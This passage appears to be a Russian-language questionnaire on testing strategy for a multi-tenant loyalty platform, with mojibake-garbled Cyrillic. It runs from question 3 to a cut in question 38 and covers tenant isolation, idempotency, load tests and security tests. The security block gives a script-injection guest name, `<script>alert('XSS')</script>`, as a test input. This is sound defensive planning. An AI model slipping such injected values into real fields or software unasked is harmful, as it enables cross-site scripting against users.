**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** **CRITICAL SECURITY**. Tenant A –ù–ï –î–û–õ–ñ–ï–ù –≤–∏–¥–µ—Ç—å –¥–∞–Ω–Ω—ã–µ Tenant B.

```typescript
// Service method:
async getGuestCards(tenantId: string, filters: Filters): Promise<GuestCard[]>
```

**–í–æ–ø—Ä–æ—Å:** –î–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ª–∏ unit tests –¥–ª—è tenant isolation?

- A) –î–∞, unit tests –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ (mock Prisma —Å tenantId filter)
- B) –ù–µ—Ç, –Ω—É–∂–Ω—ã integration tests —Å —Ä–µ–∞–ª—å–Ω–æ–π –ë–î
- C) –ù–µ—Ç, –Ω—É–∂–Ω—ã dedicated security tests (–ø–æ–ø—ã—Ç–∫–∞ –æ–±–æ–π—Ç–∏ tenantId)
- D) B + C + automated penetration testing

***

### **4. Ball Expiration Logic - –≥—Ä–∞–Ω–∏—á–Ω—ã–µ —É—Å–ª–æ–≤–∏—è?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ë–∞–ª–ª—ã —Å–≥–æ—Ä–∞—é—Ç —á–µ—Ä–µ–∑ 365 –¥–Ω–µ–π. Edge cases?

```typescript
// Expire balls older than 365 days
expireBalls(guestCardId: string, cutoffDate: Date): Promise<{ expired: number }>
```

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ —Ç–µ—Å—Ç–∏—Ä—É–µ–º?

- A) Happy path: –±–∞–ª–ª—ã —Å—Ç–∞—Ä—à–µ 365 –¥–Ω–µ–π —Å–≥–æ—Ä–∞—é—Ç
- B) Edge case: –±–∞–ª–ª—ã —Ä–æ–≤–Ω–æ 365 –¥–Ω–µ–π (–≤–∫–ª—é—á–∏—Ç—å –∏–ª–∏ –Ω–µ—Ç?)
- C) Edge case: timezone issues (UTC vs local time)
- D) –í—Å–µ –≤—ã—à–µ–ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–Ω–æ–µ + race conditions (concurrent expiration)

***

### **5. Promo Campaign Validation - –±–∏–∑–Ω–µ—Å-–ø—Ä–∞–≤–∏–ª–∞?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Admin —Å–æ–∑–¥–∞—ë—Ç promo: "–î–≤–æ–π–Ω—ã–µ –±–∞–ª–ª—ã –≤ –ø—è—Ç–Ω–∏—Ü—É —Å 18:00 –¥–æ 22:00".

```typescript
// Validate promo campaign
validatePromo(promo: PromoDto): ValidationResult
```

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ –≤–∞–ª–∏–¥–∏—Ä—É–µ–º –≤ unit tests?

- A) –¢–æ–ª—å–∫–æ required fields (name, start date, end date)
- B) Business rules: start < end, –Ω–µ –ø–µ—Ä–µ—Å–µ–∫–∞–µ—Ç—Å—è —Å –¥—Ä—É–≥–∏–º–∏ promo
- C) Complex conditions: –¥–µ–Ω—å –Ω–µ–¥–µ–ª–∏, –≤—Ä–µ–º—è, –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞
- D) B + C + simulate promo application (dry-run)

***

## **–ë–õ–û–ö 2: INTEGRATION TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **6. POS Webhook Processing - idempotency?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** POS –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ–¥–∏–Ω webhook **–¥–≤–∞–∂–¥—ã** –∏–∑-–∑–∞ network timeout.

```typescript
POST /webhooks/transaction
{
  "posCheckId": "CHK-123456",
  "checkAmount": 2850,
  "guestPhone": "+79991234567"
}
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å idempotency?

- A) –û—Ç–ø—Ä–∞–≤–∏—Ç—å –æ–¥–∏–Ω webhook ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç
- B) –û—Ç–ø—Ä–∞–≤–∏—Ç—å –æ–¥–∏–Ω webhook **–¥–≤–∞–∂–¥—ã** ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–∏–ª–∏—Å—å —Ç–æ–ª—å–∫–æ —Ä–∞–∑
- C) B + –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å —Ä–∞–∑–Ω–∏—Ü–µ–π –≤ 1 —Å–µ–∫—É–Ω–¥—É (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å Redis TTL)
- D) C + –æ—Ç–ø—Ä–∞–≤–∏—Ç—å concurrent requests (10 –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ)

***

### **7. Database Transactions - rollback –ø—Ä–∏ –æ—à–∏–±–∫–µ?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ù–∞—á–∏—Å–ª–µ–Ω–∏–µ –±–∞–ª–ª–æ–≤ = multi-step process:

1. Create BallTransaction
2. Update GuestCard balance
3. Create Notification
4. Log Audit

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –µ—Å–ª–∏ —à–∞–≥ 3 fail?

- A) Partial commit (–±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã, notification –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω) - ‚ùå BAD
- B) Full rollback (–Ω–∏—á–µ–≥–æ –Ω–µ –∏–∑–º–µ–Ω–∏–ª–æ—Å—å) - ‚úÖ GOOD
- C) Retry step 3 –æ—Ç–¥–µ–ª—å–Ω–æ
- D) B + –∫–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å rollback –≤ integration tests?

***

### **8. External Service Failures - resilience?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Telegram API –≤–µ—Ä–Ω—É–ª 503 Service Unavailable.

```typescript
// Send notification via Telegram
sendTelegramNotification(guestId: string, message: string)
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å retry logic?

- A) Mock Telegram API ‚Üí –≤—Å–µ–≥–¥–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç 503
- B) Mock ‚Üí –ø–µ—Ä–≤—ã–µ 2 –ø–æ–ø—ã—Ç–∫–∏ 503, —Ç—Ä–µ—Ç—å—è 200 OK
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å exponential backoff delays
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å Dead Letter Queue (DLQ) –ø–æ—Å–ª–µ 3 failures

***

### **9. Concurrent Webhook Processing - race conditions?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** 2 POS —Ç–µ—Ä–º–∏–Ω–∞–ª–∞ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç webhooks –¥–ª—è –æ–¥–Ω–æ–≥–æ –≥–æ—Å—Ç—è.

```
Thread 1: Credit 100 balls (balance: 500 ‚Üí 600)
Thread 2: Credit 200 balls (balance: 500 ‚Üí 700) ‚ùå Wrong! Should be 800
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å concurrent processing?

- A) Unit test —Å locks (optimistic/pessimistic locking)
- B) Integration test: –∑–∞–ø—É—Å—Ç–∏—Ç—å 10 webhooks –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ñ–∏–Ω–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å = —Å—É–º–º–∞ –≤—Å–µ—Ö –Ω–∞—á–∏—Å–ª–µ–Ω–∏–π
- D) C + stress test (100+ concurrent webhooks)

***

### **10. Database Connection Pool - leak detection?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Prisma connection pool = 10 connections. –£—Ç–µ—á–∫–∞ ‚Üí production –ø–∞–¥–∞–µ—Ç.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å connection leaks?

- A) Unit test (–Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ)
- B) Integration test: –≤—ã–ø–æ–ª–Ω–∏—Ç—å 100 queries –ø–æ–¥—Ä—è–¥
- C) B + –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å active connections –≤ PostgreSQL
- D) C + automated test –≤ CI/CD (fail –µ—Å–ª–∏ leak –æ–±–Ω–∞—Ä—É–∂–µ–Ω)

***

## **–ë–õ–û–ö 3: E2E TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **11. Guest Registration Flow - –ø–æ–ª–Ω—ã–π —Å—Ü–µ–Ω–∞—Ä–∏–π?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ì–æ—Å—Ç—å —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è —á–µ—Ä–µ–∑ Telegram Bot.

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ —Ç–µ—Å—Ç–∏—Ä—É–µ–º E2E?

- A) API endpoints –æ—Ç–¥–µ–ª—å–Ω–æ (–Ω–µ E2E)
- B) –ü–æ–ª–Ω—ã–π flow: /start ‚Üí enter phone ‚Üí verify OTP ‚Üí profile created
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ guest card —Å–æ–∑–¥–∞–Ω —Å QR –∫–æ–¥–æ–º
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ welcome notification –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω

***

### **12. Ball Earning Flow - –æ—Ç webhook –¥–æ notification?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ì–æ—Å—Ç—å –æ–ø–ª–∞—Ç–∏–ª —á–µ–∫ ‚Üí POS webhook ‚Üí –±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã ‚Üí notification.

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ –ø—Ä–æ–≤–µ—Ä—è–µ–º E2E?

- A) Webhook –æ–±—Ä–∞–±–æ—Ç–∞–Ω –±–µ–∑ –æ—à–∏–±–æ–∫
- B) –ë–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å –≤ –ë–î)
- C) B + notification sent (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤ Telegram/Email)
- D) C + audit log —Å–æ–∑–¥–∞–Ω + analytics updated

***

### **13. Level Upgrade Flow - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π upgrade?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ì–æ—Å—Ç—å –¥–æ—Å—Ç–∏–≥ 10,000‚ÇΩ ‚Üí –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π upgrade Bronze ‚Üí Silver.

**–í–æ–ø—Ä–æ—Å:** E2E test —Å—Ü–µ–Ω–∞—Ä–∏–π?

- A) Manually update totalSpent to 10,000‚ÇΩ ‚Üí check level
- B) Simulate multiple transactions –¥–æ 10,000‚ÇΩ ‚Üí check level
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å notification "–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å Silver!"
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ earnPercentage –∏–∑–º–µ–Ω–∏–ª—Å—è —Å 5% ‚Üí 7%

***

### **14. Promo Campaign Application - –≤—Ä–µ–º–µ–Ω–Ω–∞—è –∞–∫—Ü–∏—è?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Promo "–î–≤–æ–π–Ω—ã–µ –±–∞–ª–ª—ã –ø–æ –ø—è—Ç–Ω–∏—Ü–∞–º" –∞–∫—Ç–∏–≤–µ–Ω.

**–í–æ–ø—Ä–æ—Å:** E2E test?

- A) –°–æ–∑–¥–∞—Ç—å promo ‚Üí –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å
- B) Simulate transaction –≤ –ø—è—Ç–Ω–∏—Ü—É ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –±–∞–ª–ª–æ–≤ x2
- C) B + simulate transaction –≤ –ø–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫ ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±—ã—á–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ promo –∏—Å—Ç—ë–∫ –ø–æ—Å–ª–µ end date

***

### **15. Admin Impersonation Flow - Owner ‚Üí Manager view?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Owner –º–æ–∂–µ—Ç "–≤–æ–π—Ç–∏" –∫–∞–∫ Manager –¥–ª—è troubleshooting.

**–í–æ–ø—Ä–æ—Å:** E2E test?

- A) Owner login ‚Üí click "Impersonate Manager" ‚Üí check UI
- B) A + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ Manager –≤–∏–¥–∏—Ç —Ç–æ–ª—å–∫–æ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ audit log –∑–∞–ø–∏—Å–∞–ª impersonation
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å "Exit Impersonation" ‚Üí Owner view restored

***

## **–ë–õ–û–ö 4: CONTRACT TESTING (5 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **16. POS Webhook Schema - contract tests?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** iiko –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å webhook schema –±–µ–∑ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ –∑–∞—â–∏—Ç–∏—Ç—å—Å—è?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ –Ω–µ –∏–∑–º–µ–Ω—è—Ç
- B) Contract tests (Pact): –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ schema –Ω–µ –∏–∑–º–µ–Ω–∏–ª—Å—è
- C) B + automated alerts –µ—Å–ª–∏ schema –∏–∑–º–µ–Ω–∏–ª—Å—è
- D) C + backward compatibility layer (–ø–æ–¥–¥–µ—Ä–∂–∫–∞ —Å—Ç–∞—Ä—ã—Ö –≤–µ—Ä—Å–∏–π)

***

### **17. API Versioning - breaking changes?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** API v1 deprecated, –Ω—É–∂–Ω–æ –º–∏–≥—Ä–∏—Ä–æ–≤–∞—Ç—å –∫–ª–∏–µ–Ω—Ç–æ–≤ –Ω–∞ v2.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) Unit tests –¥–ª—è v2
- B) Contract tests: v1 –∏ v2 –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ
- C) B + automated tests –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
- D) C + monitoring: —Å–∫–æ–ª—å–∫–æ –∫–ª–∏–µ–Ω—Ç–æ–≤ –µ—â—ë –Ω–∞ v1

***

### **18. Telegram Bot Commands - contract?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Telegram Bot –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∫–æ–º–∞–Ω–¥—ã: /start, /balance, /history.

**–í–æ–ø—Ä–æ—Å:** Contract tests?

- A) Manual testing –∫–æ–º–∞–Ω–¥
- B) Automated tests: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–º–∞–Ω–¥—É ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ—Ç–≤–µ—Ç
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å schema –æ—Ç–≤–µ—Ç–∞ (buttons, inline keyboard)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ deprecated –∫–æ–º–∞–Ω–¥—ã –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç migration notice

***

### **19. External API Changes - –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Resend Email API –º–æ–∂–µ—Ç –∏–∑–º–µ–Ω–∏—Ç—å response format.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ –Ω–µ –∏–∑–º–µ–Ω—è—Ç
- B) Contract tests —Å actual API (–Ω–µ mock)
- C) B + automated tests –≤ CI/CD (daily)
- D) C + fallback provider (SendGrid) –µ—Å–ª–∏ Resend unavailable

***

### **20. Database Schema Changes - migration tests?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Prisma migration –¥–æ–±–∞–≤–ª—è–µ—Ç –Ω–æ–≤–æ–µ –ø–æ–ª–µ.

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) –ü—Ä–∏–º–µ–Ω–∏—Ç—å migration –≤ dev ‚Üí manual test
- B) Automated test: apply migration ‚Üí rollback ‚Üí re-apply
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –¥–∞–Ω–Ω—ã–µ –Ω–µ –ø–æ—Ç–µ—Ä—è–ª–∏—Å—å
- D) C + —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –Ω–∞ production-like dataset (1M rows)

***

## **–ë–õ–û–ö 5: LOAD \& PERFORMANCE TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **21. Webhook Throughput - —Å–∫–æ–ª—å–∫–æ webhooks/sec?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –†–µ—Å—Ç–æ—Ä–∞–Ω –≤ —á–∞—Å –ø–∏–∫ = 100 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π/–º–∏–Ω—É—Ç—É.

**–í–æ–ø—Ä–æ—Å:** –ù—É–∂–µ–Ω –ª–∏ load test?

- A) –ù–µ—Ç, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ production monitoring
- B) –î–∞, simulate 100 webhooks/min
- C) B + simulate 1000 webhooks/min (10x peak)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å latency (p50, p95, p99)

***

### **22. Concurrent User Load - —Å–∫–æ–ª—å–∫–æ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Black Friday ‚Üí 1000 –≥–æ—Å—Ç–µ–π –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–∫—Ä—ã–≤–∞—é—Ç Telegram Mini App.

**–í–æ–ø—Ä–æ—Å:** Load test —Å—Ü–µ–Ω–∞—Ä–∏–π?

- A) 10 concurrent users (smoke test)
- B) 100 concurrent users (expected load)
- C) 1000 concurrent users (peak load)
- D) C + 5000 users (stress test –¥–æ failure)

***

### **23. Database Query Performance - slow queries?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** `/guests` endpoint –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∏–∑ 10,000 –≥–æ—Å—Ç–µ–π.

**–í–æ–ø—Ä–æ—Å:** Performance test?

- A) Query —Å LIMIT 10 (pagination)
- B) Query –±–µ–∑ LIMIT (full scan) - ‚ùå BAD
- C) A + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ query < 100ms
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ indexes –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è (EXPLAIN ANALYZE)

***

### **24. Background Job Processing - queue saturation?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** BullMQ queue = 10,000 notifications –≤ –æ—á–µ—Ä–µ–¥–∏.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) Add 100 jobs ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω—ã
- B) Add 10,000 jobs ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å throughput
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ workers –Ω–µ –ø–∞–¥–∞—é—Ç (OOM)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å latency (–≤—Ä–µ–º—è –æ—Ç enqueue –¥–æ complete)

***

### **25. Memory Leak Detection - production memory usage?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ü–æ—Å–ª–µ 24 hours –≤ production memory usage = 2GB (was 500MB).

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å?

- A) Manual monitoring –≤ production
- B) Load test: run 10,000 requests ‚Üí check memory
- C) B + soak test (24 hours continuous load)
- D) C + automated heap dump analysis (Chrome DevTools)

***

### **26. Cache Effectiveness - hit rate?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Redis cache –¥–ª—è guest cards, loyalty rules.

**–í–æ–ø—Ä–æ—Å:** Performance test?

- A) Query –±–µ–∑ cache ‚Üí measure latency
- B) Query —Å cache ‚Üí measure latency (should be faster)
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å cache hit rate (> 80%)
- D) C + simulate cache eviction (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –Ω–µ –ø–∞–¥–∞–µ—Ç)

***

### **27. File Upload Performance - chunked uploads?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Admin –∑–∞–≥—Ä—É–∂–∞–µ—Ç CSV (10MB) —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏.

**–í–æ–ø—Ä–æ—Å:** Performance test?

- A) Upload 1MB file ‚Üí success
- B) Upload 10MB file ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å chunked upload
- C) B + Upload 100MB file ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å limits
- D) C + concurrent uploads (10 users –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ)

***

### **28. API Rate Limiting - –∑–∞—â–∏—Ç–∞ –æ—Ç abuse?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Rate limit = 100 requests/min per tenant.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) Send 50 requests ‚Üí all succeed
- B) Send 100 requests ‚Üí all succeed
- C) Send 150 requests ‚Üí 50 –¥–æ–ª–∂–Ω—ã –≤–µ—Ä–Ω—É—Ç—å 429 Too Many Requests
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ rate limit reset —á–µ—Ä–µ–∑ 1 –º–∏–Ω—É—Ç—É

***

### **29. Database Connection Pool - exhaustion?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Prisma connection pool = 10 connections.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) 5 concurrent queries ‚Üí all succeed
- B) 10 concurrent queries ‚Üí all succeed (pool full)
- C) 20 concurrent queries ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å queuing (–Ω–µ –ø–∞–¥–∞–µ—Ç)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å timeout –µ—Å–ª–∏ pool saturated > 30sec

***

### **30. Notification Sending - burst traffic?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Promo campaign ‚Üí 10,000 notifications –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ.

**–í–æ–ø—Ä–æ—Å:** Load test?

- A) Send 100 notifications ‚Üí check delivery rate
- B) Send 10,000 notifications ‚Üí check queue saturation
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å rate limits external providers (Telegram, Email)
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å fallback –µ—Å–ª–∏ provider unavailable

***

## **–ë–õ–û–ö 6: SECURITY TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **31. SQL Injection - –∑–∞—â–∏—Ç–∞?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** User input –≤ filters: `/guests?search=` + malicious SQL.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ Prisma –∑–∞—â–∏—â–∞–µ—Ç
- B) Automated OWASP ZAP scan
- C) B + manual penetration test
- D) C + parameterized queries + input validation

***

### **32. XSS Attacks - sanitization?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Guest name = `<script>alert('XSS')</script>`.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Manual test: enter malicious input
- B) Automated test: inject XSS payloads
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å sanitization (DOMPurify)
- D) C + CSP headers –ø—Ä–æ–≤–µ—Ä–∫–∞

***

### **33. Authentication Bypass - JWT validation?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Expired JWT token –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å rejected.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Unit test JWT validation
- B) Integration test: send expired token ‚Üí 401
- C) B + test tampered token (signature invalid)
- D) C + test token from –¥—Ä—É–≥–æ–≥–æ tenant (tenant isolation)

***

### **34. Authorization - RBAC enforcement?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** GUEST —Ä–æ–ª—å –Ω–µ –¥–æ–ª–∂–Ω–∞ –∏–º–µ—Ç—å –¥–æ—Å—Ç—É–ø –∫ Admin panel.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Unit test @Roles decorator
- B) Integration test: GUEST token ‚Üí /admin ‚Üí 403
- C) B + test all protected endpoints
- D) C + automated matrix test (–≤—Å–µ—Ö roles x –≤—Å–µ—Ö endpoints)

***

### **35. Tenant Isolation - data leakage?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Tenant A –Ω–µ –¥–æ–ª–∂–µ–Ω –≤–∏–¥–µ—Ç—å guests –∏–∑ Tenant B.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Unit test —Å mock (–Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ)
- B) Integration test: query —Å tenantId=A ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
- C) B + –ø–æ–ø—ã—Ç–∫–∞ –æ–±–æ–π—Ç–∏: query —Å tenantId=B –∏—Å–ø–æ–ª—å–∑—É—è token –æ—Ç A
- D) C + automated penetration test (–≤—Å–µ—Ö endpoints)

***

### **36. Rate Limiting - brute force protection?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Login endpoint = max 5 attempts/15 min.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Manual test: 6 login attempts
- B) Automated test: 10 attempts ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å 429 –ø–æ—Å–ª–µ 5
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å lockout duration (15 min)
- D) C + CAPTCHA –ø–æ—Å–ª–µ 3 failures

***

### **37. CSRF Protection - state-changing requests?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** POST /balls/credit –¥–æ–ª–∂–µ–Ω —Ç—Ä–µ–±–æ–≤–∞—Ç—å CSRF token.

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) –ù–∞–¥–µ—è—Ç—å—Å—è —á—Ç–æ framework –∑–∞—â–∏—â–∞–µ—Ç
- B) Manual test: POST –±–µ–∑ CSRF token ‚Üí 403
- C) B + automated test –≤—Å–µ—Ö POST/PUT/DELETE endpoints
- D) C + SameSite cookie policy

***

### **38. Sensitive Data Exposure - logs \& errors?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Error message —Å–æ–¥–µ—Ä–∂–∏—Ç sensitive data (passwords, tokens).

**–í–æ–ø—Ä–æ—Å:** Security test?

- A) Manual code review
- B) Automated test: trigger errors ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å response
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å logs (–Ω–µ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å passwords)
